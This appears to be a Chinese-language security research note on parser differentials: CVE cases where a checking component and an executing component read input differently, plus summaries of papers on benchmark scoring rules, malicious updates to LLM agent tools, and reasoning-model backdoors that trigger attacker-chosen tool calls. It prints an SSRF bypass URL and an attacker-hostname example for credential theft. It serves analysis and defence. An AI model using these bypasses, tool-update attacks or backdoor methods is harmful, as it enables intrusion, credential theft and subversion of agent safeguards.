---
title: 解析器差异——检查字节的组件与执行字节的组件读到的不是同一个字符串
topic: parser-differential
created: 2026-11-03
---

# 解析器差异——检查与执行读到的是不同的字节

一个在同一批次（2026-11-03 20:22）反复出现五次的类：**安全属性实现在一个解析输入的组件里，而效果发生在另一个再次解析输入的组件里。** 下面每个案例都能通过"护栏存在吗"这种朴素测试——护栏在、规则写着、评审点了头——却在工件上失效，因为两个组件对"这个字符串是什么"意见不一致。

相邻文件：[[security]]（本文件扩展的 CVE 架子）、[[vuln-supply]]（记录溯源与范围）、[[harness-reliability]]（agent harness 内部的同一个接缝）、[[fact-check]]（被引用的数字与它来自的工件）、[[disclosure-lag]]（修复何时发布、记录何时发布）。

**主张：** 任何由*解析*强制的边界，分析单位不是规则，而是**这一对**——哪个解析器在检查、哪个在执行、两者是不是同一份代码。只有一个解析器的规则是检查；有两个解析器的规则是愿望。

## 1. SSRF：`urlparse` 检查一个主机，`urllib3` 拨号另一个

`CVE-2026-120630`（CrewAI，CERT/CC 作为 CNA，发布 **2026-11-02T17:37:05Z**，ID 预留 **17:35:36Z**——相隔 89 秒）。对 `http://127.0.0.1:8080\@1.1.1.1/`：

| 解析器 | 用户名 | 主机 |
|---|---|---|
| `urllib.parse.urlparse` | `127.0.0.1:8080\` | **1.1.1.1** |
| `urllib3.util.parse_url` | — | **127.0.0.1** |

Python 标准库把反斜杠当作普通的 userinfo 字符；urllib3 把它当分隔符。于是护栏批准的是攻击者写下的*外部*主机，而套接字连到护栏从未看见的内部主机。一手核实记录：

- `affected[]` = `{version: "0", lessThan: "1.15.17", versionType: "custom"}`，产品标为 **CrewAI**（修复实际落在 `crewai-tools`）。
- `problemTypes` 是**自由文本**——`"CWE-918 Server-Side Request Forgery (SSRF)"`，**未填 `cweId`**。一个"有没有 CWE"的检查会把这记录读成没有 CWE。
- CNA 容器里**完全没有 `metrics` 键**，NVD **0 条指标**，状态 **`Deferred`**——所以这里"CVSS"在任何一方都没有值。这是接近溯源情形（4）：不是政策拒绝，只是没人打分。
- 修复是 **PR #6981**，"fix(tools): pin SSRF fetches to the validated peer IP"，2026-08-17 合并——早于记录 **77 天**——而它声明的靶子*不是*反斜杠：那次抓取"没有连到 `validate_url` 检查过的 IP"，因为 urllib3 在开套接字时会重新解析 DNS。反斜杠案例是连接时钉住 IP 的副作用。

同一作者在 IBM 的 Langflow 里找到了同样的形状：`CVE-2026-19304`，**7.7**（`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`，`CWE-918`），NVD `Analyzed` 但只有一条 `psirt@us.ibm.com` 的指标、**0 条 `nvd@nist.gov`**——这是背书情形，不是 NVD 的分数。Langflow 有 **6** 条 KEV 条目（`CVE-2025-3248` … `CVE-2026-9198`，已对目录核实）；**`CVE-2026-19304` 一条都不在里面**——KEV 追踪的是产品，不是 CVE。

**可迁移的检查：** 拒绝名单的强度等于路径上**最窄**的那个解析器。用*执行器*会重新解析的字符串去测护栏，不要拿字面的 `127.0.0.1` 去测。

## 2. 没有锚点的正则就是后缀匹配

`CVE-2026-105769`（kaniko 1.25.20 之前，Chainguard 作为 CNA，预留 2026-10-05T19:21Z，发布 **2026-11-02T16:49Z**，修复 tag `v1.25.20` 于 **2026-10-27T19:05Z**——早 6 天）。kaniko 把任何它没有凭据的 registry 交给 `docker-credential-acr-env`，后者的判断是：

```
.*\.azurecr\.io|.*\.azurecr\.cn|.*\.azurecr\.de|.*\.azurecr\.us
```

没有锚点，于是**任何包含** `.azurecr.io` 的主机名都匹配——包括 `x.azurecr.io.attacker.com`。一个 Dockerfile 里的 `FROM x.azurecr.io.attacker.com/img`（或 `COPY --from=`）会让该 helper 取来构建的 Azure 身份（service principal 环境变量、联邦工作负载身份令牌或托管身份），并**把它两次 POST 到攻击者的主机**——一次作为 `Authorization: Bearer`，一次作为 `access_token` 表单字段。分数 **9.3**（`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`），`CWE-346` + `CWE-522`，`chainguard` 的指标，NVD `Awaiting Analysis` 且 **0 条 NVD 自评**。

工件分裂才是教训：kaniko 把 helper **内嵌**在 `third_party/` 下并修了自己的副本，所以 kaniko 的发布是安全的，而依赖本身不是——`chrismellard/docker-credential-acr-env` 的 issue **#21**「Azure AD token disclosed to attacker-controlled hosts: ACR hostname pattern is unanchored」于 **2026-08-13** 提交，至今**仍开着**（2026-11-03 核实）。任何其他引入该 helper 的项目仍有这个洞。

## 3. 一把钥匙开所有基础设施，从前端被允许发起的抓取里漏出

`CVE-2026-89292`（Eclipse Mnestix Browser **1.6.0 → <2.3.0**）：未认证的调用者可以泄取 **所有已配置基础设施**共用的 `MNESTIX_BACKEND_API_KEY`。**9.2 CVSS 4.0**（`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N`——只影响机密性，但对易受攻击系统和后续系统都是高），`CWE-918` **和** `CWE-522`，`emo@eclipse.org` 的指标，NVD **`Received`**、0 条指标。两个 CWE 合起来点名了形状：钥匙通过浏览器前端被允许代表调用者执行的 SSRF 泄出，而凭据本身保护不足——**一把**钥匙开部署接入的每一个端点，所以爆炸半径是整个集成，不是被触碰的那台主机。

日期是补录，已在容器里核实：ID 预留 **2026-09-11T12:47:13Z**，修复 **2.3.0** 于 **2026-09-10T13:59Z**（*早于*预留一天），记录发布 **2026-11-03T09:31:27Z**——修复后 **54 天**。核查时最新发布是 **2.4.1**（2026-11-02T14:16Z）。记录的引用只有两个 GitLab 工作项、没有厂商公告页，所以 `descriptions[]` 就是全部公开陈述。

## 4. 打分器也是解析器：同一批输出上 22 个点

arXiv **2611.03377**（"Same Outputs, Different Scores"，2026-11-02 提交）。八个同行评议多模态基准的官方打分器，五个能在单张 16 GB GPU 上跑的开源 VLM，用盲评的人类 + LLM 评审来裁定模型实际答了什么（Cohen's **κ = 0.956**）。摘要逐字：

> "The scoring rule alone moves accuracy by up to 22 points on identical outputs, yet exactly 0
> wherever a model emits clean option letters, so it hides on strong-model leaderboards."

伤害在**回退策略**里，不在模型的啰嗦里：不合规回答最多的那个基准，其打分假象恰好为 **0**（它的打分器选择弃权而不是猜）；而一个测得不合规率为 **0.000** 的推理模型，仍会因解析器保留*轨迹里的哪一段正则匹配*而摆动 **9.5 个点**。三种标准策略没有一种是安全的——把非回答吸附到最近选项会为从未给出的答案记分，弃权会丢掉用文字说出的正确答案，似然打分则跟随答案 token 的先验。所以一个已发布的分数是**能力 × 解析器的运气**，而这个误差恰恰在评审者最看的地方（前沿模型的那些行）不可见。

## 5. 审批发生在准入时，而字节在那之后会变

arXiv **2611.01976**（"Beyond Prompt Injection: The Tool Update Gap in LLM Agent Security"，2026-11-01 提交）。**ETUDE** 把一个*初始无害*工具的**更新**里嵌入恶意功能，同时保留其合法行为。这里没有对抗性指令，所以每一种检查"模型可见内容"的防御——提示注入检测器、技能审查、静态扫描——都无物可看：被更新的代码在**上下文窗口之外**执行。

七个框架（Gemini CLI、Codex CLI、Claude Code、DeepSeek Harness、OpenCode、Pi、Goose）、三种工具功能、三个未授权目标：**97.6% ASR**，同时**95.9%** 的合法任务完成率，比最强的提示注入基线高 **85.1%**。作者自己写的范围限制（全文可 grep）：

> "We demonstrate attacks with researcher-authored tool implementations with carefully monitored
> permissions instead of modifying open-source tools in the wild, to avoid potential ethical
> issues."

以及点名这个缺口的那句：当框架要求确认时，"the harness supplies a one-time approval for that call; this does not re-examine the updated implementation." 他们的修复是在运行时强制执行带外的最小权限工具策略——**在执行处拒绝**，而不是在准入处。设计含义值得记下：**工具变更时重新审批**是最便宜的控制，而它根本不是模型侧的控制。

## 6. 后门以一个*更好*的检查点抵达，并且住在推理轨迹里

arXiv **2611.00138**（Kerkoporta，2026-10-29 提交）。结构化输出后门：上下文里任意位置的触发器让推理模型发出攻击者选定的**工具调用**，由 harness 执行。通过蒸馏轨迹的 SFT 植入（Qwen3.5-122B-A10B 教师，约 1.5 万个编码任务），受害者是 Qwen3.5-4B 与 9B，跨 Claude Code、Codex 与 Pi 三个 harness，三个载荷覆盖机密性／完整性／可用性。头条：成功率**最高 96.2%**。

两条要带走的发现：

- **效用声明只是一个单元格。** 摘要里的 "The resulting models can outperform the clean baseline on standard utility benchmarks" 只对一行成立——4B 在 TerminalBench-Lite **剔除超时**后（干净 **42.8** → 后门 **58.4**，+15.6）——而同一个检查点在 SWE-bench Verified 上**低于**基线（40.9 对 42.9；51.1 对 51.8），9B 在任何报告的配置里都没有超过基线。所以一个被投毒的权重发布，到你检查的那个基准上会显得*更好*。
- **泛化住在思维链里，不在触发器里。** 从推理轨迹中去掉对触发器/载荷的确认，可以把分布外 ASR 从 **94.8–84.1%** 降到 **1.0–0.0%**。所以轨迹是筛查必须读的工件——而它恰好也是"隐藏 CoT"政策（论题 9）从视野里移除的东西。

## 本批次产出的检查清单

1. **点名两个解析器。** 哪个组件在*检查*、哪个在*执行*，它们共享代码吗？没有 `^`/`$` 的正则、标准库解析器对库解析器、打分器的正则对模型的散文——都是同一类。
2. **问护栏绑定的是什么。** 一个主机名字符串、一个工具在安装时的身份，还是一个不覆盖将要运行的实现的审批令牌。
3. **问修复落在哪里。** 在把依赖内嵌进去的产品里（kaniko），还是在其他所有人都在引入的依赖里（仍开着，#21）？
4. **对基准数字，问是哪个规则产生的**，以及模型是否真的会输出该规则假定的格式——这个误差在强模型上为零，这正是它活下来的原因。
5. **对被投毒的模型，不要盯着质量下降。** 在它真正会运行的 harness 下做行为筛查，再加上溯源；轨迹是可读的表面。
